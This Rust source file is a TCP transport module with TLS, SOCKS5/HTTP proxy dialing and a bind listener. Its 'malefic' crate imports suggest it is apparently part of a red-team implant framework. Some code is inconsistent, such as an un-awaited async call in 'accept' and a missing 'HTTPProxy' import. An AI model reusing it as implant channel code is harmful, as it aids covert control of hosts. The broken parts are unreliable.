#[cfg(feature = "tls")]
pub mod tls;

#[cfg(feature = "proxy")]
use crate::config::{PROXY_HOST, PROXY_PASSWORD, PROXY_PORT, PROXY_USERNAME};
#[cfg(feature = "proxy")]
use crate::transport::proxie::{AsyncProxy, Auth, SOCKS5Proxy};
use crate::transport::{DialerExt, TransportImpl, Stream};
use anyhow::Result;
use async_net::TcpStream;
use async_trait::async_trait;
use futures::{AsyncRead, AsyncWrite};
use std::pin::Pin;
use std::task::{Context, Poll};

#[cfg(feature = "tls")]
pub use tls::TlsConfig;
#[cfg(feature = "tls")]
use async_tls::{client::TlsStream};

pub enum TCPTransport<T: TransportImpl = TcpStream> {
    Plain(T),
    #[cfg(feature = "tls")]
    Tls(TlsStream<T>),
}

impl<T: TransportImpl> TCPTransport<T> {
    /// 创建普通传输（不使用TLS）
    pub fn new_plain(stream: T) -> Self {
        TCPTransport::Plain(stream)
    }
}

impl TCPTransport<TcpStream> {
    /// 创建TCP传输，根据feature自动决定是否使用TLS
    pub async fn new(stream: TcpStream) -> Result<Self> {
        #[cfg(feature = "tls")]
        {
            let tls_config = tls::build_tls_config();
            Self::new_with_tls(stream, tls_config).await
        }
        #[cfg(not(feature = "tls"))]
        {
            Ok(TCPTransport::Plain(stream))
        }
    }

    /// 使用指定TLS配置创建TLS传输
    #[cfg(feature = "tls")]
    pub async fn new_with_tls(stream: TcpStream, config: TlsConfig) -> Result<Self> {
        let server_name = if config.server_name.is_empty() {
            "localhost".to_string()
        } else {
            config.server_name.clone()
        };

        debug!("[tls] Connecting to {} with TLS", server_name);

        let connector = tls::TlsConnectorBuilder::new(config).build()?;
        let tls_stream = connector.connect(&server_name, stream).await?;

        debug!("[tls] TLS handshake completed successfully");
        Ok(TCPTransport::Tls(tls_stream))
    }
}

impl<T: TransportImpl> AsyncRead for TCPTransport<T> {
    fn poll_read(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut [u8],
    ) -> Poll<Result<usize, std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_read(cx, buf),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_read(cx, buf),
        }
    }
}

impl<T: TransportImpl> AsyncWrite for TCPTransport<T> {
    fn poll_write(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<Result<usize, std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_write(cx, buf),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_write(cx, buf),
        }
    }

    fn poll_flush(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Result<(), std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_flush(cx),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_flush(cx),
        }
    }

    fn poll_close(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Result<(), std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_close(cx),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_close(cx),
        }
    }
}

#[derive(Clone)]
pub struct TCPClient {
    pub stream: Stream,
}

impl TCPClient {
    pub fn new(cryptor: Cryptor) -> Result<Self> {
        Ok(TCPClient {
            stream: Stream { cryptor },
        })
    }
}

#[async_trait]
impl DialerExt for TCPClient {
    async fn connect(&mut self, addr: &str) -> Result<TCPTransport<TcpStream>> {
        let tcp_stream: Result<TcpStream, anyhow::Error> = {
            #[cfg(feature = "socks5_proxy")]
            {
                let proxy = SOCKS5Proxy::new(
                    &PROXY_HOST,
                    PROXY_PORT.parse()?,
                    Auth::new(&PROXY_USERNAME, &PROXY_PASSWORD),
                );
                let stream = proxy.connect(addr).await.map_err(|e| anyhow::anyhow!("SOCKS5 proxy error: {}", e))?;
                Ok(stream.into_tcpstream())
            }
            #[cfg(feature = "http_proxy")]
            {
                let proxy = HTTPProxy::new(
                    &PROXY_HOST,
                    PROXY_PORT.parse()?,
                    Auth::new(&PROXY_USERNAME, &PROXY_PASSWORD),
                );
                let stream = proxy.connect(addr).await.map_err(|e| anyhow::anyhow!("HTTP proxy error: {}", e))?;
                Ok(stream.into_tcpstream())
            }
            #[cfg(not(feature = "proxy"))]
            {
                TcpStream::connect(addr).await.map_err(|e| anyhow::anyhow!("TCP connect error: {}", e))
            }
        };
        TCPTransport::new(tcp_stream?).await
    }
}

#[cfg(feature = "bind")]
use crate::transport::ListenerExt;
#[cfg(feature = "bind")]
use async_net::TcpListener;
use malefic_helper::debug;
use malefic_proto::crypto::Cryptor;

#[cfg(feature = "bind")]
pub struct TCPListenerExt {
    listener: TcpListener,
}

#[cfg(feature = "bind")]
#[async_trait]
impl ListenerExt for TCPListenerExt {
    async fn bind(addr: &str) -> Result<Self> {
        let listener = TcpListener::bind(addr).await?;
        Ok(TCPListenerExt { listener })
    }

    async fn accept(&mut self) -> Result<TCPTransport> {
        let (stream, _addr) = self.listener.accept().await?;
        Ok(TCPTransport::new(stream))
    }
}
